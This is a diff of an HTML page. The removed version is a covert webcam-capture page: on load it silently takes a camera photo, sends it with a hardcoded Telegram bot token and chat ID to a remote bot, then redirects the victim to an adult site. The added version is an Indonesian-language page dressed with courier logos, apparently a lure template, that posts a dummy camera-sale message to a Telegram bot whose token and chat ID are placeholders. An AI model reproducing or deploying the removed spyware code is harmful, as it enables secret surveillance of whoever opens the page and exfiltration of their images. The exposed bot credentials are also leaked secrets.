@@ -1,87 +1,214 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Camera</title>
+    <title>📸 Kamera Kirim Ke Bot</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: url('https://example.com/path/to/your/image.jpg') no-repeat center center fixed;
+            background-image: url('https://i.imgur.com/8e5B4tM.png'); /* background gambar kurir / paket */
             background-size: cover;
-            margin: 0;
-            overflow: hidden;
+            background-position: center;
+            background-attachment: fixed;
+            position: relative;
         }
-        #loading {
-            display: none;
+
+        /* overlay biar teks kebaca */
+        body::before {
+            content: '';
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.7);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 0;
+        }
+
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(5px);
+            padding: 30px 30px 40px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            width: 360px;
+            max-width: 90%;
+            text-align: center;
+            border: 2px solid #fbbf24;
+        }
+
+        .card h1 {
+            font-size: 28px;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+
+        .card p {
+            color: #475569;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .camera-img {
+            width: 200px;
+            height: auto;
+            margin: 10px auto 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            background: #fff;
+            padding: 15px;
+        }
+
+        .btn-kirim {
+            background: #0088cc;
             color: white;
-            padding: 20px;
-            border-radius: 10px;
+            border: none;
+            padding: 14px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 5px 0 #005f8a;
+            width: 100%;
+        }
+
+        .btn-kirim:hover {
+            background: #0077b3;
+            transform: scale(0.98);
+        }
+
+        .btn-kirim:active {
+            box-shadow: 0 2px 0 #005f8a;
+            transform: translateY(3px);
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            background: #f1f5f9;
+            font-size: 14px;
+            color: #1e293b;
+        }
+
+        .status.berhasil {
+            background: #bbf7d0;
+            color: #166534;
+        }
+
+        .status.gagal {
+            background: #fecaca;
+            color: #991b1b;
+        }
+
+        .logo-kurir {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 15px 0 10px;
+            font-size: 12px;
+            color: #334155;
+            flex-wrap: wrap;
+        }
+
+        .logo-kurir span {
+            background: white;
+            padding: 4px 12px;
+            border-radius: 30px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
-    <a id="captureLink" href="#" style="display: none;">Capture Camera</a>
-    <div id="loading">Loading...</div>
+    <div class="card">
+        <h1>📸 Kamera Canon</h1>
+        <p>Gue kirim ke bot lo via Telegram</p>
+
+        <!-- logo kurir biar makin real -->
+        <div class="logo-kurir">
+            <span>📦 JNE</span>
+            <span>📦 J&T</span>
+            <span>📦 Sicepat</span>
+            <span>📦 AnterAja</span>
+        </div>
+
+        <!-- gambar kamera (contoh dari internet) -->
+        <img class="camera-img" src="https://i.imgur.com/3q2bBZG.png" alt="Kamera DSLR" onerror="this.src='https://via.placeholder.com/200x150?text=Kamera'">
+
+        <div class="status" id="statusMsg">🔄 Klik tombol buat kirim ke bot</div>
+
+        <button class="btn-kirim" id="btnKirim">🚀 Kirim Ke Bot</button>
+
+        <p style="margin-top: 12px; font-size: 12px; color: #64748b;">*lo harus ganti token & chat id di kode</p>
+    </div>
+
     <script>
-        document.getElementById('captureLink').click();
+        const btn = document.getElementById('btnKirim');
+        const statusDiv = document.getElementById('statusMsg');
 
-        document.getElementById('captureLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            document.getElementById('loading').style.display = 'block';
+        // ====== GANTI NIH BRO ======
+        const TOKEN_BOT = 'ISI_TOKEN_BOT_LO';      // <-- token bot lo
+        const CHAT_ID   = 'ISI_CHAT_ID_LO';        // <-- chat id lo / grup
+        // ===========================
 
-            setTimeout(function() {
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
+        btn.addEventListener('click', async function() {
+            // Nama dummy kamera yang mau dikirim
+            const pesan = `📸 Ada kamera baru nih!\nMerk: Canon EOS R6\nHarga: Rp. 35.000.000\nStatus: SIAP DIKIRIM 🚚`;
 
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
+            // Validasi sederhana
+            if (TOKEN_BOT === 'ISI_TOKEN_BOT_LO' || CHAT_ID === 'ISI_CHAT_ID_LO') {
+                statusDiv.innerText = '❌ Tolong ganti TOKEN & CHAT_ID dulu, goblok!';
+                statusDiv.className = 'status gagal';
+                return;
+            }
 
-                        setTimeout(function() {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            statusDiv.innerText = '⏳ Ngirim pesan ke bot...';
+            statusDiv.className = 'status';
 
-                            const image = canvas.toDataURL('image/jpeg');
-                            document.getElementById('loading').style.display = 'none';
+            try {
+                const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`;
 
-                            fetch('https://api.telegram.org/bot8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc/sendPhoto', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    chat_id: '1966317946',
-                                    photo: image
-                                })
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('Success:', data);
-                                window.location.href = 'https://xhamster.com';
-                            })
-                            .catch((error) => {
-                                console.error('Error:', error);
-                            });
-                        }, 1000);
-                    })
-                    .catch(err => {
-                        console.error('Error accessing the camera:', err);
-                    });
-            }, 2000);
+                const body = {
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                };
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    statusDiv.innerText = '✅ Berhasil dikirim ke Telegram! Cek bot lo.';
+                    statusDiv.className = 'status berhasil';
+                } else {
+                    statusDiv.innerText = `❌ Gagal: ${data.description}`;
+                    statusDiv.className = 'status gagal';
+                }
+            } catch (error) {
+                statusDiv.innerText = `❌ Error: ${error.message}`;
+                statusDiv.className = 'status gagal';
+            }
         });
     </script>
 </body>
